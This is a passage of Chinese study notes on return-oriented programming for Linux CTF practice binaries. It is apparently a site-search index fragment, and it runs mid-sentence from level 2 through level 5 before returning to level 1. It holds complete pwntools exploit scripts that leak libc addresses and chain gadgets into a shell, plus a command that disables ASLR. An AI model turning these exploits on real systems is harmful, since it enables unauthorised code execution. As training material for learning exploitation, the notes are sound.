\u51fd\u6570\u3001gadget\u7b49\u5730\u5740\uff0c\u53ef\u80fd\u56e0\u7535\u8111\u4e0d\u540c\u800c\u4e0d\u4e00\u81f4\u3002\u8bf7\u52a8\u624b\u64cd\u4f5c\uff0c\u83b7\u53d6\u672c\u673a\u76f8\u5173\u5730\u5740\u540e\uff0c\u81ea\u884c\u66ff\u6362 #coding = utf-8 from pwn import * elf = ELF ( './level2' ) plt_write = elf . symbols [ 'write' ] plt_read = elf . symbols [ 'read' ] vulfun_addr = 0x08048404 # \u8bf7\u6839\u636e\u5b9e\u9645\u800c\u66ff\u6362 bss_addr = 0x0804a018 # \u8bf7\u6839\u636e\u5b9e\u9645\u800c\u66ff\u6362 pppr = 0x080484bd # \u8bf7\u6839\u636e\u5b9e\u9645\u800c\u66ff\u6362 def leak ( address ): payload1 = 'a' * 140 + p32 ( plt_write ) + p32 ( vulfun_addr ) + p32 ( 1 ) + p32 ( address ) + p32 ( 4 ) p . send ( payload1 ) data = p . recv ( 4 ) print \" %#x => %s \" % ( address , ( data or '' ) . encode ( 'hex' )) return data p = process ( './level2' ) d = DynELF ( leak , elf = ELF ( './level2' )) system_addr = d . lookup ( 'system' , 'libc' ) print \"system_addr=\" + hex ( system_addr ) payload2 = 'a' * 140 + p32 ( plt_read ) + p32 ( pppr ) + p32 ( 0 ) + p32 ( bss_addr ) + p32 ( 8 ) # \u5199\u5165read\u90e8\u5206 payload2 += p32 ( system_addr ) + p32 ( vulfun_addr ) + p32 ( bss_addr ) # \u8c03\u7528system\u90e8\u5206 print \" \\n ###sending payload2 ...###\" p . send ( payload2 ) p . send ( \"/bin/sh \\0 \" ) p . interactive () linux_64\u4e0elinux_86\u7684\u533a\u522b \u00b6 linux_64\u4e0elinux_86\u7684\u533a\u522b\u4e3b\u8981\u6709\u4e24\u70b9\uff1a \u9996\u5148\u662f\u5185\u5b58\u5730\u5740\u7684\u8303\u56f4\u753132\u4f4d\u53d8\u6210\u4e8664\u4f4d \u3002\u4f46\u662f\u53ef\u4ee5\u4f7f\u7528\u7684\u5185\u5b58\u5730\u5740\u4e0d\u80fd\u5927\u4e8e0x00007fffffffffff\uff0c\u5426\u5219\u4f1a\u629b\u51fa\u5f02\u5e38\u3002 \u5176\u6b21\u662f\u51fd\u6570\u53c2\u6570\u7684\u4f20\u9012\u65b9\u5f0f\u53d1\u751f\u4e86\u6539\u53d8 \uff0cx86\u4e2d\u53c2\u6570\u90fd\u662f\u4fdd\u5b58\u5728\u6808\u4e0a\uff0c\u4f46\u5728x64\u4e2d\u7684\u524d\u516d\u4e2a\u53c2\u6570\u4f9d\u6b21\u4fdd\u5b58\u5728RDI\uff0cRSI\uff0cRDX\uff0cRCX\uff0cR8\u548c R9\u4e2d\uff0c\u5982\u679c\u8fd8\u6709\u66f4\u591a\u7684\u53c2\u6570\u7684\u8bdd\u624d\u4f1a\u4fdd\u5b58\u5728\u6808\u4e0a\u3002 x64\u7bc7 \u00b6 level 3 - \u901a\u8fc7 ROP \u7ed5\u8fc7 DEP \u548c ASLR \u9632\u62a4 \u00b6 \u8001\u6837\u5b50\uff0c\u5728\u6f0f\u6d1e\u51fd\u6570\u4e2d\uff0c\u5b58\u5728\u7740\u6808\u6ea2\u51fa\u3002\u7a0b\u5e8f\u4e2d\u4e5f\u6709\u9884\u7559\u7684\u540e\u95e8\u51fd\u6570 callsystem \u3002\u601d\u8def\u5c31\u662f\u5229\u7528\u6808\u6ea2\u51fa\uff0c\u8986\u5199rip\u4e3a\u540e\u95e8\u51fd\u6570\u5185\u5b58\u5730\u5740 0x0000000000400584 \u3002 \u8fd9\u91cc\u8ba1\u7b97\u6ea2\u51fa\u9700\u8981\u7684\u8986\u5199\u957f\u5ea6\uff0c\u4e0d\u91c7\u53d6\u539f\u6587\u4e2d\u7684\u65b9\u6cd5\uff0c\u800c\u662f\u901a\u8fc7IDA\u5206\u6790\u8ba1\u7b97\u5f97\u51fa\uff0c\u5177\u4f53\u8ba1\u7b97\u5982\u4e0b\uff1a0x80 + 0x8 \u3002\u8986\u5199\u5b8c\u6210\u540e\u7684\u4f4d\u7f6e\u5230\u8fbe rip \u4e0a\u4e00\u4e2a\u5185\u5b58\u7a7a\u95f4\u3002 \u6700\u7ec8exp\u5982\u4e0b\uff1a #!python #!/usr/bin/env python from pwn import * elf = ELF ( 'level3' ) p = process ( './level3' ) #p = remote('127.0.0.1',10001) callsystem = 0x0000000000400584 payload = \"A\" * 136 + p64 ( callsystem ) p . send ( payload ) p . interactive () level 4 - \u4f7f\u7528ROPgadget\u5bfb\u627egadgets \u00b6 x86 \u7684\u53c2\u6570\u90fd\u662f\u4fdd\u5b58\u5728\u6808\u4e0a\uff08\u5373\u6808\u4f20\u53c2\uff09\u3002\u800c x64 \u7684\u524d\u516d\u4e2a\u53c2\u6570\u4f9d\u6b21\u4fdd\u5b58\u5728RDI\u3001RSI\u3001RDX\u3001RCX\u3001R8 \u548c R9 \u5bc4\u5b58\u5668\u4e2d\uff0c\u8fd8\u6709\u66f4\u591a\u7684\u53c2\u6570\u624d\u4f1a\u4fdd\u5b58\u5230\u6808\u4e0a\u3002\u6240\u4ee5\u5982\u679c\u6211\u4eec\u9700\u8981\u4f20\u9012\u5c11\u91cf\u7684\u53c2\u6570\u5c31\u9700\u8981\u7528\u5230 gadget \u3002\u7b80\u5355\u7684 gadget \uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4 objdump \u67e5\u627e\uff0c\u5982\u679c\u9700\u8981\u590d\u6742\u7684 gadget \u65f6\uff08\u6216\u8005\u8bf4\u66f4\u52a0\u5e38\u7528\u7684\uff09\uff0c\u5c31\u9700\u8981\u501f\u52a9\u8bf8\u5982 ROPgadget\u3001Ropper\u3001ROPEME \u7b49\u7b49\u67e5\u8be2\u5de5\u5177\u3002 \u4f7f\u7528\u547d\u4ee4 ROPgadget --binary level4 --only \"pop|ret\" \u641c\u7d22\u4e00\u4e0b level 4 \u4e2d\u6240\u6709 pop ret \u7684 gadget\u3002\u5c31\u8fd9\u4e2a\u7a0b\u5e8f\u800c\u8a00\uff0c\u592a\u5c0f\u4e86\uff0c\u627e\u4e0d\u5230 pop rdi;ret \u7684 gadget\u3002\uff08\u4e0d\u4fe1\u4f60\u8bd5\u8bd5XD\uff09 \u7531\u4e8e\u7a0b\u5e8f\u8c03\u7528\u4e86 libc.so \uff0c\u90a3\u6211\u4eec\u5c31\u67e5\u67e5 libc.so \u4e2d\u6709\u6ca1\u6709\u9700\u8981\u7684 gadget \u3002\u9996\u5148\uff0c\u9700\u8981\u5c06\u4f7f\u7528\u7684 libc \u590d\u5236\u5230\u5de5\u4f5c\u76ee\u5f55\u3002\u7136\u540e\u5728\u4f7f\u7528 ROPgadget \u67e5\u8be2\u3002\u627e\u5230gadget\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u6784\u9020ROP\u94fe\u3002 # \u67e5\u8be2\u4f7f\u7528\u7684libc.so\u6240\u5728 ldd level4 # \u590d\u5236 & \u91cd\u547d\u540d sudo cp /lib/x86_64-linux-gnu/libc.so.6 libc.so ROPgadget --binary libc.so --only \"pop|ret\" \u200b ``` ( \u7701\u7565 ) 0x0000000000021102 : pop rdi ; ret \u200b ``` ( \u7701\u7565 ) \u5148\u586b\u5145\u6808\u7a7a\u95f4\uff0c\u5230\u8fbe rip \u4e0a\u4e00\u4e2a\u5185\u5b58\u7a7a\u95f4\u3002\u8986\u5199\u4e3agadget\u5730\u5740\uff0c\u518d\u63a5\u7740\u662f /bin/sh \u5185\u5b58\u5730\u5740\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5c06 /bin/sh \u5b58\u5165\u5230 rdi \u5bc4\u5b58\u5668\u3002\u7136\u540e\u8fd0\u884c\u6307\u9488\u518d\u8df3\u8f6c\u5230 rip+0x10 (\u5373system_addr\u88ab\u6211\u4eec\u5199\u5165\u7684\u4f4d\u7f6e)\uff0c\u6267\u884c system(\"/bin/sh\") \u3002\u6700\u7ec8\u6784\u6210\u7684ROP\u94fe\uff1a payload = \" \\x00 \" * 136 + p64 ( pop_ret_addr ) + p64 ( binsh_addr ) + p64 ( system_addr ) \u6700\u7ec8 exp \u6784\u9020\u5982\u4e0b\uff1a #!python #!/usr/bin/env python from pwn import * libc = ELF ( 'libc.so.6' ) p = process ( './level4' ) #p = remote('127.0.0.1',10001) binsh_addr_offset = next ( libc . search ( '/bin/sh' )) - libc . symbols [ 'system' ] print \"binsh_addr_offset = \" + hex ( binsh_addr_offset ) pop_ret_offset = 0x0000000000022a12 - libc . symbols [ 'system' ] print \"pop_ret_offset = \" + hex ( pop_ret_offset ) #pop_pop_call_offset = 0x00000000000f4739 - libc.symbols['system'] #print \"pop_pop_call_offset = \" + hex(pop_pop_call_offset) print \" \\n ##########receiving system addr########## \\n \" system_addr_str = p . recvuntil ( ' \\n ' ) system_addr = int ( system_addr_str , 16 ) print \"system_addr = \" + hex ( system_addr ) binsh_addr = system_addr + binsh_addr_offset print \"binsh_addr = \" + hex ( binsh_addr ) pop_ret_addr = system_addr + pop_ret_offset print \"pop_ret_addr = \" + hex ( pop_ret_addr ) #pop_pop_call_addr = system_addr + pop_pop_call_offset #print \"pop_pop_call_addr = \" + hex(pop_pop_call_addr) p . recv () payload = \" \\x00 \" * 136 + p64 ( pop_ret_addr ) + p64 ( binsh_addr ) + p64 ( system_addr ) #payload = \"\\x00\"*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr) print \" \\n ##########sending payload########## \\n \" p . send ( payload ) p . interactive () level 5 - \u901a\u7528gadget \u00b6 \u56e0\u4e3a\u7a0b\u5e8f\u5728\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u4f1a\u52a0\u5165\u4e00\u4e9b\u901a\u7528\u51fd\u6570\u7528\u6765\u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c\uff08\u6bd4\u5982\u52a0\u8f7dlibc.so\u7684\u521d\u59cb\u5316\u51fd\u6570\uff09\uff0c\u6240\u4ee5\u867d\u7136\u5f88\u591a\u7a0b\u5e8f\u7684\u6e90\u7801\u4e0d\u540c\uff0c\u4f46\u662f\u521d\u59cb\u5316\u7684\u8fc7\u7a0b\u662f\u76f8\u540c\u7684\uff0c\u56e0\u6b64\u9488\u5bf9\u8fd9\u4e9b\u521d\u59cb\u5316\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u63d0\u53d6\u4e00\u4e9b\u901a\u7528\u7684gadgets\u52a0\u4ee5\u4f7f\u7528\uff0c\u4ece\u800c\u8fbe\u5230\u6211\u4eec\u60f3\u8981\u8fbe\u5230\u7684\u6548\u679c\u3002 level 5 \u4ec5\u4ec5\u53ea\u6709\u4e00\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\u70b9 \uff0c\u4e5f\u6ca1\u6709\u4efb\u4f55\u7684\u8f85\u52a9\u51fd\u6570\u53ef\u4ee5\u4f7f\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u5148\u60f3\u529e\u6cd5\u6cc4\u9732\u5185\u5b58\u4fe1\u606f\uff0c\u627e\u5230 system() \u7684\u5730\u5740\uff0c\u7136\u540e\u518d\u4f20\u9012 /bin/sh \u5230 .bss \u6bb5\u3002 \u4e3a\u4ec0\u4e48\u4f20\u9012 /bin/sh \u5230 .bss\u6bb5 \u6700\u540e\u8c03\u7528 system(\u201c/bin/sh\u201d) \u3002\u56e0\u4e3a\u539f\u7a0b\u5e8f\u4f7f\u7528\u4e86 write() \u548c read() \u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 write() \u53bb\u8f93\u51fa write.got \u7684\u5730\u5740\uff0c\u4ece\u800c\u8ba1\u7b97\u51fa libc.so \u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u3002\u4f46\u95ee\u9898\u5728\u4e8e write() \u7684\u53c2\u6570\u5e94\u8be5\u5982\u4f55\u4f20\u9012\u3002\u6211\u4eec\u4f7f\u7528 ROPgadget \u5e76\u6ca1\u6709\u627e\u5230\u7c7b\u4f3c\u4e8e pop rdi, ret,pop rsi, ret \u8fd9\u6837\u7684 gadgets \u3002\u90a3\u5e94\u8be5\u600e\u4e48\u529e\u5462\uff1f\u5176\u5b9e\u5728 x64 \u4e0b\u6709\u4e00\u4e9b\u4e07\u80fd\u7684 gadgets \u53ef\u4ee5\u5229\u7528\u3002 \u84b8\u7c73\u5e08\u5085\u63d0\u4f9b\u7f16\u8bd1\u597d\u7684\u6587\u4ef6\u548c\u4e0b\u9762\u6709\u70b9\u533a\u522b\uff0c\u4e0b\u9762\u662f\u7528\u76f8\u540c\u6e90\u7801\u5728ubuntu 16.04 \u4e0b\u7f16\u8bd1\uff0c\u7f16\u8bd1\u6307\u4ee4\uff1agcc -fno-stack-protector -o level5 level5.c \u4f7f\u7528\u547d\u4ee4 objdump -d level5 \u627e\u5230\u8c03\u7528libc.so\u7684\u521d\u59cb\u5316\u51fd\u6570 __libc_csu_init() \u3002\u6c47\u7f16\u4ee3\u7801\u5982\u4e0b\uff1a 00000000004005c0 <__libc_csu_init>: 4005c0: 41 57 push %r15 4005c2: 41 56 push %r14 4005c4: 41 89 ff mov %edi,%r15d 4005c7: 41 55 push %r13 4005c9: 41 54 push %r12 4005cb: 4c 8d 25 3e 08 20 00 lea 0x20083e(%rip),%r12 # 600e10 <__frame_dummy_init_array_entry> 4005d2: 55 push %rbp 4005d3: 48 8d 2d 3e 08 20 00 lea 0x20083e(%rip),%rbp # 600e18 <__init_array_end> 4005da: 53 push %rbx 4005db: 49 89 f6 mov %rsi,%r14 4005de: 49 89 d5 mov %rdx,%r13 4005e1: 4c 29 e5 sub %r12,%rbp 4005e4: 48 83 ec 08 sub $0x8,%rsp 4005e8: 48 c1 fd 03 sar $0x3,%rbp 4005ec: e8 0f fe ff ff callq 400400 <_init> 4005f1: 48 85 ed test %rbp,%rbp 4005f4: 74 20 je 400616 <__libc_csu_init+0x56> 4005f6: 31 db xor %ebx,%ebx 4005f8: 0f 1f 84 00 00 00 00 nopl 0x0(%rax,%rax,1) 4005ff: 00 400600: 4c 89 ea mov %r13,%rdx 400603: 4c 89 f6 mov %r14,%rsi 400606: 44 89 ff mov %r15d,%edi 400609: 41 ff 14 dc callq *(%r12,%rbx,8) 40060d: 48 83 c3 01 add $0x1,%rbx 400611: 48 39 eb cmp %rbp,%rbx 400614: 75 ea jne 400600 <__libc_csu_init+0x40> 400616: 48 83 c4 08 add $0x8,%rsp 40061a: 5b pop %rbx 40061b: 5d pop %rbp 40061c: 41 5c pop %r12 40061e: 41 5d pop %r13 400620: 41 5e pop %r14 400622: 41 5f pop %r15 400624: c3 retq 400625: 90 nop 400626: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 40062d: 00 00 00 \u5229\u7528\u5176\u4e2d 0x40061a \u5f00\u59cb\u76846\u884c\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u5bc4\u5b58\u5668 rbx,rbp,r12,r13,r14,r15 \u7684\u503c\u3002\u968f\u540e\u53ef\u4ee5\u5229\u7528 0x400600 \u5f00\u59cb\u76846\u884c\u4ee3\u7801\uff0c\u5c06 r15 \u7684\u503c\u8d4b\u503c\u7ed9 rdx \uff0c r14 \u7684\u503c\u8d4b\u503c\u7ed9 rsi \uff0c r13 \u7684\u503c\u8d4b\u503c\u7ed9 edi \u3002\u968f\u540e\u5c31\u4f1a\u8c03\u7528call qword ptr [r12+rbx*8]\u3002\u53ea\u8981\u6211\u4eec\u63a7\u5236rbx\u7684\u503c\u4e3a 0 \uff0c\u7cbe\u5fc3\u6784\u9020\u6808\u4e0a\u4f20\u5165\u4e0a\u8ff0\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u63a7\u5236 pc \uff0c\u8c03\u7528\u6211\u4eec\u60f3\u8981\u7684\u51fd\u6570\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981\u63a7\u5236 rbx \u7684\u503c\u4e3a0\uff1f \u6267\u884c\u5b8c call qword ptr [r12+rbx*8] \u4e4b\u540e\uff0c\u7a0b\u5e8f\u4f1a\u5bf9rbx+=1\uff0c\u7136\u540e\u5bf9\u6bd4 rbp \u548c rbx \u7684\u503c\uff0c\u5982\u679c\u76f8\u7b49\u5c31\u4f1a\u7ee7\u7eed\u5411\u4e0b\u6267\u884c\u5e76 ret \u5230\u6211\u4eec\u60f3\u8981\u7ee7\u7eed\u6267\u884c\u7684\u5730\u5740\u3002\u6240\u4ee5\u4e3a\u4e86\u8ba9 rbp \u548c rbx \u7684\u503c\u76f8\u7b49\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 rbp \u7684\u503c\u8bbe\u7f6e\u4e3a1\uff0c\u56e0\u4e3a\u4e4b\u524d\u5df2\u7ecf\u5c06 rbx \u7684\u503c\u8bbe\u7f6e\u4e3a0\u4e86\u3002 \u6211\u4eec\u5148\u6784\u9020 payload1 \uff0c\u5229\u7528 write() \u8f93\u51fa write \u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u3002\u6ce8\u610f\u6211\u4eec\u7684 gadget \u662f call qword ptr [r12+rbx*8] \uff0c\u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u4f7f\u7528 write.got \u7684\u5730\u5740\u800c\u4e0d\u662f write.plt \u7684\u5730\u5740\u3002\u5e76\u4e14\u4e3a\u4e86\u8fd4\u56de\u5230\u539f\u7a0b\u5e8f\u4e2d\uff0c\u91cd\u590d\u5229\u7528buffer overflow\u7684\u6f0f\u6d1e\uff0c\u6211\u4eec\u9700\u8981\u7ee7\u7eed\u8986\u76d6\u6808\u4e0a\u7684\u6570\u636e\uff0c\u76f4\u5230\u628a\u8fd4\u56de\u503c\u8986\u76d6\u6210\u76ee\u6807\u51fd\u6570\u7684main\u51fd\u6570\u4e3a\u6b62\u3002 \u4e3a\u4ec0\u4e48\u4f7f\u7528\u7684\u662f write.got \u800c\u4e0d\u662f write.plt\uff1f write.plt \u76f8\u5f53\u4e8e call write\u3002\u6267\u884c\u4e86\u4e24\u4e2a\u52a8\u4f5c\uff0c\u5c06\u6307\u9488\u8df3\u8f6c\u5230 write \u771f\u5b9e\u5730\u5740\uff1b\u5c06\u8fd4\u56de\u5730\u5740\u538b\u6808\u3002 write.got \u4ec5\u5c06\u6307\u9488\u8df3\u8f6c\u5230 write \u771f\u5b9e\u5730\u5740\u3002 payload1 \u6784\u9020\u5982\u4e0b\uff1a #rdi= edi = r13, rsi = r14, rdx = r15 #write(rdi=1, rsi=write.got, rdx=4) payload1 = \" \\x00 \" * 136 payload1 += p64 ( 0x400606 ) + p64 ( 0xdeadbeef ) + p64 ( 0 ) + p64 ( 1 ) + p64 ( got_write ) + p64 ( 1 ) + p64 ( got_write ) + p64 ( 8 ) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret payload1 += p64 ( 0x4005F0 ) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8] payload1 += \" \\x00 \" * 56 payload1 += p64 ( main ) \u5f53\u6211\u4eec exp \u5728\u6536\u5230 write() \u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u540e\uff0c\u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa system() \u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u4e86\u3002\u63a5\u7740\u6211\u4eec\u6784\u9020 payload2 \uff0c\u5229\u7528 read() \u5c06 system() \u7684\u5730\u5740\u4ee5\u53ca /bin/sh \u8bfb\u5165\u5230 .bss \u6bb5\u5185\u5b58\u4e2d\u3002 payload2 \u6784\u9020\u5982\u4e0b\uff1a #rdi= edi = r13, rsi = r14, rdx = r15 #read(rdi=0, rsi=bss_addr, rdx=16) payload2 = \" \\x00 \" * 136 payload2 += p64 ( 0x400606 ) + p64 ( 0xdeadbeef ) + p64 ( 0 ) + p64 ( 1 ) + p64 ( got_read ) + p64 ( 0 ) + p64 ( bss_addr ) + p64 ( 16 ) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret payload2 += p64 ( 0x4005F0 ) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8] payload2 += \" \\x00 \" * 56 payload2 += p64 ( main ) \u6700\u540e\u6211\u4eec\u6784\u9020 payload3 ,\u8c03\u7528 system() \u51fd\u6570\u6267\u884c /bin/sh \u3002\u6ce8\u610f\uff0c system() \u7684\u5730\u5740\u4fdd\u5b58\u5728\u4e86 .bss \u6bb5\u9996\u5730\u5740\u4e0a\uff0c /bin/sh \u7684\u5730\u5740\u4fdd\u5b58\u5728\u4e86 .bss \u6bb5\u9996\u5730\u5740+8\u5b57\u8282\u4e0a\u3002 #rdi= edi = r13, rsi = r14, rdx = r15 #system(rdi = bss_addr+8 = \"/bin/sh\") payload3 = \" \\x00 \" * 136 payload3 += p64 ( 0x400606 ) + p64 ( 0xdeadbeef ) + p64 ( 0 ) + p64 ( 1 ) + p64 ( bss_addr ) + p64 ( bss_addr + 8 ) + p64 ( 0 ) + p64 ( 0 ) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret payload3 += p64 ( 0x4005F0 ) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8] payload3 += \" \\x00 \" * 56 payload3 += p64 ( main ) \u4ee5\u4e0a\u662f\u84b8\u7c73\u6587\u7ae0\u9605\u8bfb\u540e\u7684\u7406\u89e3\u7b14\u8bb0 \u6700\u7ec8exp\u5982\u4e0b\uff1a from pwn import * p = process ( './level5' ) #p = remote('192.168.17.155',10001) elf = ELF ( 'level5' ) libc = elf . libc main = elf . symbols [ 'main' ] bss_addr = elf . bss () gadget1 = 0x40061a gadget2 = 0x400600 got_write = elf . got [ 'write' ] print \"[*]write() got: \" + hex ( got_write ) got_read = elf . got [ 'read' ] print \"[*]read() got: \" + hex ( got_read ) def csu ( rbx , rbp , r12 , r13 , r14 , r15 , ret ): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = \"A\" * 136 payload += p64 ( gadget1 ) + p64 ( rbx ) + p64 ( rbp ) + p64 ( r12 ) + p64 ( r13 ) + p64 ( r14 ) + p64 ( r15 ) payload += p64 ( gadget2 ) payload += \"B\" * 56 payload += p64 ( ret ) return payload #write(rdi=1, rsi=write.got, rdx=4) payload1 = csu ( 0 , 1 , got_write , 8 , got_write , 1 , main ) p . recvuntil ( \"Hello, World \\n \" ) print \" \\n #############sending payload1############# \\n \" p . send ( payload1 ) sleep ( 1 ) write_addr = u64 ( p . recv ( 8 )) print \"[*]leak write() addr: \" + hex ( write_addr ) libc . address = write_addr - libc . symbols [ 'write' ] execve_addr = libc . symbols [ \"execve\" ] print \"[*]execve() addr: \" + hex ( execve_addr ) p . recvuntil ( \"Hello, World \\n \" ) #read(rdi=0, rsi=bss_addr, rdx=16) payload2 = csu ( 0 , 1 , got_read , 16 , bss_addr , 0 , main ) print \" \\n #############sending payload2############# \\n \" p . send ( payload2 ) sleep ( 1 ) p . send ( p64 ( execve_addr )) p . send ( \"/bin/sh \\0 \" ) sleep ( 1 ) p . recvuntil ( \"Hello, World \\n \" ) #execve(rdi = bss_addr+8 = \"/bin/sh\", rsi=0, rdx=0) payload3 = csu ( 0 , 1 , bss_addr , 0 , 0 , bss_addr + 8 , main ) print \" \\n #############sending payload3############# \\n \" sleep ( 1 ) p . send ( payload3 ) p . interactive ()","title":"\u84b8\u7c73ROP\u7b14\u8bb0"},{"location":"Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#roplinux-","text":"","title":"\u4e00\u6b65\u4e00\u6b65\u5b66ROP\u4e4bLinux\u7bc7 - \u5b66\u4e60\u7b14\u8bb0"},{"location":"Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#_1","text":"ROP \u7684\u5168\u79f0\u4e3a Return-oriented programming \uff08\u8fd4\u56de\u5bfc\u5411\u7f16\u7a0b\uff09\u3002\u662f\u4e00\u79cd\u9ad8\u7ea7\u7684\u5185\u5b58\u653b\u51fb\u6280\u672f\u53ef\u4ee5\u7528\u6765\u7ed5\u8fc7\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u7684\u5404\u79cd\u901a\u7528\u9632\u5fa1\uff08\u6bd4\u5982\u5185\u5b58\u4e0d\u53ef\u6267\u884c\u548c\u4ee3\u7801\u7b7e\u540d\u7b49\uff09","title":"\u57fa\u7840\u4ecb\u7ecd"},{"location":"Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#x86","text":"","title":"x86\u7bc7"},{"location":"Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#level-1-shellcode","text":"\u5e38\u89c1\u7684\u7a0b\u5e8f\u6d41\u52ab\u6301\u5c31\u662f\u6808\u6ea2\u51fa\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb\u548c\u5806\u6ea2\u51fa\u3002\u6700\u5e38\u89c1\u7684\u9632\u5fa1\u65b9\u6cd5\u6709DEP\uff08\u5806\u6808\u4e0d\u53ef\u6267\u884c\uff09\uff0cASLR\uff08\u5185\u5b58\u5730\u5740\u968f\u673a\u5316\uff09\uff0cStack Protector\uff08\u6808\u4fdd\u62a4\uff09\u7b49\u3002\u4e0b\u9762\u770b\u770b\u8fd9\u9898\uff0c\u7a0b\u5e8f\u6d41\u52ab\u6301\u3002 \u521d\u5b66\u9636\u6bb5\uff0c\u5148\u5173\u95edLinux\u7cfb\u7edf\u7684ASLR\u4fdd\u62a4\uff1a sudo -S echo 0 > /proc/sys/kernel/randomize_va_space exit \u4e0b\u8f7d level1 \u9898\u76ee\uff0c\u653e\u5165\u5230IDA\u5206\u6790\uff0c\u5728 vulnerable_function() \u4e2d\u5b58\u5728\u7740\u6808\u6ea2\u51fa\uff080x100>88\uff09 \u8fd0\u884c\u7a0b\u5e8f\uff0c\u8f93\u5165\u4e00\u4e32\u5b57\u7b26\u4e32\u7136\u540e\u8fd4\u56dehelloworld\uff1bfile\u67e5\u770b\u662f\u4e2a\u52a8\u6001\u94fe\u63a5\u768432\u4f4d\u6587\u4ef6\uff1bchecksec\u67e5\u770b\u6240\u6709\u5b89\u5168\u7f16\u8bd1\u9009\u9879\u90fd\u6ca1\u6709\u5f00 \u7136\u540e\u5c31\u662f\u786e\u8ba4\u6ea2\u51fa\u70b9\uff08\u6808\u7684eip\uff09\u7684\u4f4d\u7f6e\uff0c\u4f7f\u7528\u4f5c\u8005\u63d0\u4f9b\u7684 pattern.py \u811a\u672c\u8fdb\u884c\u8ba1\u7b97\u3002\u521b\u5efa200\u5b57\u8282\u7684\u6d4b\u8bd5\u5b57\u7b26\u4e32 \u7136\u540e gdb ./level1 \u8c03\u8bd5\u7a0b\u5e8f\uff0c r \u8fd0\u884c\u7a0b\u5e8f\u540e\u8f93\u5165\u6d4b\u8bd5\u5b57\u7b26\u4e32\uff0c\u5f97\u5230\u5185\u5b58\u51fa\u9519\u5730\u5740\uff1a \u67e5\u8be2\u504f\u79fb\u91cf\uff0c\u8fd9\u91cc\u7684\u504f\u79fb\u91cf\u662f\u6307\u4ece\u53d8\u91cf\u5199\u5165\u5904\u5230eip\u9876\u5185\u5b58\u957f\u5ea6\u3002 \u5f53\u7136\uff0c\u53ef\u4ee5\u81ea\u5df1\u624b\u52a8\u8ba1\u7b97\u3002\u504f\u79fb\u91cf=0x88+0x4=140\u30020x4\u4e3aebp\uff0c0x88\u4e3a\u53d8\u91cf\u7a7a\u95f4\u3002 \u53ea\u8981\u6784\u9020\u4e00\u4e2a [shellcode][\u201cAAAAAAAAAAAAAA\u201d\u2026.][ret] \u5b57\u7b26\u4e32\uff0c\u5c31\u53ef\u4ee5\u8ba9pc\u6267\u884cret\u5730\u5740\u4e0a\u7684\u4ee3\u7801\u4e86\u3002\u4e5f\u5c31\u662f\u9700\u8981\u77e5\u9053shellcode\u6240\u5728\u7684\u5185\u5b58\u5730\u5740 